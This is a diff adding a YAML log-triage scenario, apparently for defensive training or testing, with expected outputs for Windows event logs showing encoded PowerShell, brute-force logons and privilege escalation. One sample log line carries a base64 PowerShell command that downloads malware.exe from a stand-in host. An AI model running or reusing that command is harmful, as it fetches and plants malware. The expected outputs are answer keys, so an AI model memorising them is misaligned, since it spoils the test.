@@ -1,0 +1,88 @@
+name: "Windows Log Triage Scenario"
+description: "Analyze suspicious Windows event logs for potential security incidents"
+author: "Security Team"
+version: "1.0"
+category: "log_analysis"
+
+metadata:
+  difficulty: "medium"
+  estimated_time: "5-10 minutes"
+  mitre_tactics: ["execution", "persistence", "defense_evasion"]
+  tags: ["windows", "eventlog", "powershell", "suspicious_activity"]
+
+steps:
+  - name: "suspicious_powershell_execution"
+    description: "Analyze PowerShell execution logs for malicious activity"
+    analysis_type: "log_triage"
+    input_data:
+      raw_log: |
+        2024-01-15 14:32:15 [INFO] EventID=4688 ProcessName=powershell.exe CommandLine="powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAGQAbwB3AG4AbABvAGEAZAAvAG0AYQBsAHcAYQByAGUALgBlAHgAZQA="
+        2024-01-15 14:32:16 [INFO] EventID=4688 ProcessName=cmd.exe CommandLine="cmd.exe /c echo malware.exe > temp.exe"
+        2024-01-15 14:32:17 [WARN] EventID=5001 AntivirusDetection="Suspicious file detected: temp.exe"
+        2024-01-15 14:32:18 [ERROR] EventID=4625 LogonType=3 IpAddress=192.168.1.100 TargetUserName=Administrator FailureReason=BadPassword
+    context:
+      source: "windows_security_log"
+      host: "WORKSTATION-01"
+      user: "user123"
+    expected_output:
+      threat_level: "high"
+      findings_count: 3
+      mitre_techniques: ["T1059.001", "T1071.001", "T1110"]
+      sigma_rules: ["powershell_encoded_command", "suspicious_file_creation"]
+
+  - name: "failed_authentication_analysis"
+    description: "Investigate multiple failed authentication attempts"
+    analysis_type: "log_triage"
+    input_data:
+      logs:
+        - timestamp: "2024-01-15T14:30:00Z"
+          event_id: 4625
+          logon_type: 3
+          src_ip: "192.168.1.100"
+          user: "administrator"
+          failure_reason: "BadPassword"
+        - timestamp: "2024-01-15T14:30:05Z"
+          event_id: 4625
+          logon_type: 3
+          src_ip: "192.168.1.100"
+          user: "admin"
+          failure_reason: "BadPassword"
+        - timestamp: "2024-01-15T14:30:10Z"
+          event_id: 4625
+          logon_type: 3
+          src_ip: "192.168.1.100"
+          user: "root"
+          failure_reason: "BadPassword"
+        - timestamp: "2024-01-15T14:30:15Z"
+          event_id: 4624
+          logon_type: 3
+          src_ip: "192.168.1.100"
+          user: "backup_service"
+          status: "SUCCESS"
+    context:
+      source: "domain_controller"
+      timeframe: "5_minutes"
+    expected_output:
+      threat_level: "medium"
+      findings_count: 1
+      mitre_techniques: ["T1110.001"]
+      recommendations: ["implement_account_lockout", "monitor_source_ip"]
+
+  - name: "privilege_escalation_detection"
+    description: "Detect potential privilege escalation attempts"
+    analysis_type: "log_triage"
+    input_data:
+      raw_log: |
+        2024-01-15 14:45:00 [INFO] EventID=4672 SubjectUserName=regularuser PrivilegeList="SeDebugPrivilege;SeBackupPrivilege"
+        2024-01-15 14:45:01 [INFO] EventID=4688 ProcessName=whoami.exe CommandLine="whoami /priv" ParentProcessName=cmd.exe
+        2024-01-15 14:45:02 [INFO] EventID=4688 ProcessName=net.exe CommandLine="net localgroup administrators" ParentProcessName=cmd.exe
+        2024-01-15 14:45:03 [WARN] EventID=4732 MemberName=regularuser GroupName=Administrators SourceUserName=SYSTEM
+    context:
+      source: "endpoint_security"
+      host: "CLIENT-PC-05"
+      user: "regularuser"
+    expected_output:
+      threat_level: "high"
+      findings_count: 2
+      mitre_techniques: ["T1134", "T1069.001"]
+      sigma_rules: ["privilege_escalation_whoami", "admin_group_modification"]
